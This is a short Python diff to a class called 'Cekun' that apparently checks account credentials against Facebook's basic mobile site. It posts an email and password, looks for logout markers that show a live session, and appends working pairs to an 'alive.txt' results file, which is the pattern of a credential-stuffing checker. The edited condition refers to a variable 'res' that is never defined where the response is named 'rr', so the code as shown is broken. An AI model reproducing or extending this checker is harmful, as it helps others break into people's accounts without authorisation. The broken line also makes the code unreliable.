@@ -31,7 +31,7 @@ class Cekun:
 
 	def login(self,id,pas):
 		rr=requests.post(self.u,data={'email':id,'pass':pas})
-		if 'save-device' in rr.text or 'm_sess' in rr.text:
+		if 'logout.php' in str(res) or 'mbasic_logout_button' in str(res):
 			print(f'\033[97m[\033[92mAlive\033[97m] {id} - {pas}')
 			f=open('result/checker/alive.txt','a')
 			f.write(f'{id}|{pas}\n')
